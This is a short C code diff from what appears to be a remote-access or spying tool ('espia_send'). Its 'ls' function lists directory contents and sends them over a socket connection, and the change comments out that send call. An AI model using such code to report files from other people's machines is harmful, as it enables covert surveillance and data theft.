@@ -59,6 +59,6 @@ void ls(SOCKET * connection) {
             swprintf(temp_dir, L"%S\t\t\t\t%ld bytes\n", file_data.cFileName, filesize.QuadPart);
         }
 
-        espia_send(connection, temp_dir, sizeof(file_data.cFileName));
+        //espia_send(connection, temp_dir, sizeof(file_data.cFileName));
     } while (FindNextFileW(file_handle, &file_data) != 0);
 }
